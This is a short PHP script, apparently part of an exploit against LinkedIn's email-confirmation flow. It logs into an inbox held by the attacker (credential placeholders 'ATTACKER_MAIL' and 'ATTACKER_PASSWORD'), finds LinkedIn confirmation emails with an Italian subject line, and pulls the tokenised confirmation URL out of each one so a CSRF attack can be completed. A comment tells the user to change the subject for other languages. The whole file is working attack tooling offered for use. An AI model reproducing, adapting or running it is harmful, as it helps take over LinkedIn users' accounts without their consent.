<?php

	$hostname = '{imap.gmail.com:993/imap/ssl}INBOX';
	$username = 'ATTACKER_MAIL';
	$password = 'ATTACKER_PASSWORD';
	
	$inbox = imap_open($hostname,$username,$password, NULL, 1) or die('Cannot connect to Gmail: ' . print_r(imap_errors()));
	$emails = imap_search($inbox, 'ALL');
	
	if($emails) {
	
		$url = '';
		rsort($emails);
		
		$pattern = '/<p>(http:\/\/www\.linkedin\.com\/e\/csrf.*tok=[a-zA-Z0-9]{16})<\/p>/s';
		foreach($emails as $email_number) {
		
			$overview = imap_fetch_overview($inbox, $email_number, 0);
			$message = imap_fetchbody($inbox, $email_number, 2);
			
			if(strstr($overview[0]->subject, 'Conferma il tuo indirizzo email')) { // The message is for Italian users, change it!
			
				preg_match($pattern, $message, $matches, PREG_OFFSET_CAPTURE);
				$url = imap_qprint($matches[1][0]);
				break;
			}
		}
		
	} else {
		echo "no e-mails..";
	}
	
	imap_close($inbox);
	
	echo $url;
	exit;
?>